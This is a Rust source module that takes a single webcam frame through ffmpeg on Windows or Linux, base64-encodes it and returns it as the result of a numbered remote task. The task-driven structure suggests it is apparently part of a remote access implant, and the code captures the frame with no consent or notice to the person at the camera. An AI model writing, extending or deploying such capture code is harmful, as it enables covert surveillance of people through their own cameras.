/// Media: webcam capture (stub — Windows Media Foundation is complex).

use super::TaskResult;

pub fn capture(task_id: i64, _args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        // Windows Media Foundation IMFSourceReader implementation is complex.
        // This would require COM initialization, IMFSourceReader setup, IMFMediaType
        // configuration, sample capture, and BMP/JPEG encoding.
        // Marked for Phase 3 implementation with dedicated WMF bindings.

        // Attempt a fallback using ffmpeg if available
        let output = std::process::Command::new("ffmpeg")
            .args([
                "-f", "dshow",
                "-i", "video=0",
                "-frames:v", "1",
                "-f", "image2pipe",
                "-vcodec", "bmp",
                "-",
            ])
            .output();

        match output {
            Ok(out) if out.status.success() && !out.stdout.is_empty() => {
                let encoded = crate::utils::helpers::b64_encode(&out.stdout);
                TaskResult::success_typed(task_id, encoded, "screenshot")
            }
            _ => TaskResult::error(
                task_id,
                "media capture requires ffmpeg or Phase 3 WMF implementation".to_string(),
            ),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        // Try ffmpeg on Linux
        let output = std::process::Command::new("ffmpeg")
            .args([
                "-f", "v4l2",
                "-i", "/dev/video0",
                "-frames:v", "1",
                "-f", "image2pipe",
                "-vcodec", "bmp",
                "-",
            ])
            .output();

        match output {
            Ok(out) if out.status.success() && !out.stdout.is_empty() => {
                let encoded = crate::utils::helpers::b64_encode(&out.stdout);
                TaskResult::success_typed(task_id, encoded, "screenshot")
            }
            _ => TaskResult::error(
                task_id,
                "media capture not available (no ffmpeg or camera)".to_string(),
            ),
        }
    }
}
